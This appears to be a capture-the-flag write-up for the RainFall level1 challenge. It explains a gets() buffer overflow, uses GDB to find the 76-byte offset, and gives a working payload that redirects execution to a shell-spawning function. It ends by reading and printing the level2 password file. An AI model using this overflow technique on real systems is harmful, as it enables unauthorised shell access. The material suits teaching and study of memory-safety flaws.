# Level1: Exploiting gets() for Unauthorized Shell Access

## Binary Analysis

The level1 program contains a simple buffer overflow vulnerability. Looking at the source code:

```c
#include <stdio.h>

int main(void)
{
  /* Buffer of 76 bytes allocated on the stack */
  char buffer[76];

  /* gets() reads input from stdin with NO bounds checking */
  gets(buffer);

  return 0;
}

void run(void)
{
  fwrite("Good... Wait what?\n", 1, 0x13, stdout);
  system("/bin/sh");
  return;
}
```

The key vulnerability is the use of `gets()`, which reads user input without any size limitation into a fixed-size buffer. Because of this, `gets` is inherently unsafe and was removed from the C11 standard. 

## Vulnerability Explanation

This creates a buffer overflow vulnerability because:

1. The `buffer` array is only 76 bytes long
2. `gets()` will continue reading input beyond those 76 bytes
3. Data beyond the buffer will overwrite adjacent memory on the stack
4. This includes overwriting the saved return address, allowing us to hijack program flow.
5. By overwriting the return address with the address of `run()`, we can redirect execution to that function, which calls `system("/bin/sh")`, giving us a shell.

## Locating the Target Function

First, we use GDB to find the memory address of the `run()` function:

```bash
level1@RainFall:~$ gdb -q ./level1
(gdb) p run
$1 = {<text variable, no debug info>} 0x8048444 <run>
```

We find that `run()` is located at address `0x8048444`. This function will be our target since it calls `system("/bin/sh")`.

## Crafting the Exploit

Our exploit needs to:

1. Fill the 76-byte buffer
2. Overwrite the return address with the address of `run()`

### Understanding Little-Endian Format

On x86 architecture (which the binary uses), memory addresses are stored in little-endian format. This means the least significant byte is stored at the lowest memory address.

For our address `0x08048444`:

- In big-endian: `08 04 84 44`
- In little-endian: `44 84 04 08`

We need to use the little-endian format in our payload because that's how the processor will interpret the bytes when reading the return address from the stack.

### Buffer Overflow Analysis with GDB

The GDB session provides critical insight into how the buffer overflow vulnerability works in the level1 binary. Let's break down what we're seeing:

#### Disassembly Analysis

The disassembly shows:
```
(gdb) disas main
   0x08048486 <+6>:     sub    $0x50,%esp       # Allocates 80 bytes on stack
   0x08048489 <+9>:     lea    0x10(%esp),%eax  # Buffer starts 16 bytes in
   0x0804848d <+13>:    mov    %eax,(%esp)      # Pass buffer addr to gets()
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
   0x08048495 <+21>:    leave  
   0x08048496 <+22>:    ret                     # Return instruction
```
```
(gdb) b *0x08048496
Breakpoint 1 at 0x8048496 # Set a breakpoint at the return instruction. The program will stop its execution here.
```

## Exploit Verification 

```
level1@RainFall:~$ python -c 'print("A"*76 + "B"*4 + "C"*4 + "D"*4)' > /tmp/test
```

We created a pattern of:
- 76 'A' characters (to fill the buffer)
- 4 'B' characters (to overwrite the return address)
- 4 'C' and 4 'D' characters (additional test data)

After running to the `ret` instruction:

```
(gdb) run < /tmp/test # Run the program with our test input
Starting program: /home/user/level1/level1 < /tmp/test

Breakpoint 1, 0x08048496 in main ()
(gdb) info frame
Stack level 0, frame at 0xbffff640:
 eip = 0x8048496 in main; saved eip 0x42424242
```

The **saved eip** value is `0x42424242`, which is ASCII for "BBBB". This confirms:

1. Our buffer overflow has successfully overwritten the return address
2. The offset is exactly 76 bytes (the 'B's start at position 77)
3. The return address is stored at memory location `0xbffff63c`

## Constructing the Exploit

This confirms our exploit needs:
- 76 bytes of padding
- The address of `run()` (0x08048444) in little-endian format

Instead of returning to address 0x42424242 (BBBB), we can replace it with "\x44\x84\x04\x08" to redirect execution to the `run()` function, which will provide a shell.

The GDB session validates that our exploit command is correctly formatted:
```bash
(python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
```

Breaking this down:

- `python -c '...'`: The `-c` flag allows running Python code directly from the command line
- `print "A"*76`: Creates 76 'A' characters to fill the buffer
- `"\x44\x84\x04\x08"`: The little-endian representation of the `run()` function address
- `cat` without arguments: Keeps stdin open after the exploit payload is sent
- Piping the output to `./level1`: Feeds our payload to the program's stdin

### Why We Need `cat`

The `cat` command is crucial because:

1. When the exploit succeeds and `system("/bin/sh")` executes, the shell needs an open stdin to receive commands
2. Without `cat`, stdin would close after sending the exploit, causing the shell to exit immediately
3. With `cat`, stdin remains open, allowing us to interact with the spawned shell

## Successful Exploitation

When we run our exploit:

```bash
level1@RainFall:~$ (python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
Good... Wait what?
```

We see the message from the `run()` function, confirming our exploit worked. Now we can retrieve the password:

```bash
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

This password allows us to advance to level2.
